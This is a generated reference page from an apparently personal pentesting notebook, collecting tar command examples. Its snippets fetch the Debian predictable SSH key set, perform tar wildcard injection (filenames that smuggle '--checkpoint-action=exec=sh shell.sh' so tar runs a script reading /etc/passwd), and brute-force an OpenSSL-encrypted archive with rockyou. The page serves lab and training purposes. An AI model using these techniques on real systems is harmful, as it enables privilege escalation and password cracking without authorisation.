---
title: "tar"
sidebarTitle: "tar"
description: "Commands and examples collected from your tar notes."
keywords: ["tar"]
boost: 10
hideFooterPagination: true
---

{/* Generated from Commands/tar.md. Edit the Markdown source, then run scripts/sync_site.py. */}

[Search this tool’s saved examples](/commands/notebook?tool=tar) · [All tools](/index)

## SSH Key Predictable PRNG (Authorized_Keys) Process

**Notebook example**

```ps1
git clone https://github.com/g0tmi1k/debian-ssh
cd debian-ssh
tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
```

Saved as written; may include lab values or terminal output.

[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)

## Notebook recipes

2 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.

<AccordionGroup>

<Accordion title="Wildcard">

### Wildcard

**Linux Privilege Escalation: Full Checklist**

```powershell
# create file for exploitation
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh

# vulnerable script
tar cf archive.tar *
```

</Accordion>

<Accordion title="OpenSSL-encrypted GZIP (.gzip that isn&#x27;t really gzip)">

### OpenSSL-encrypted GZIP (.gzip that isn't really gzip)

**Password Attacks: Cracking, Files, and Credential Stores**

```bash
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done
ls    # a new extracted file appears if a password worked
```

</Accordion>

</AccordionGroup>
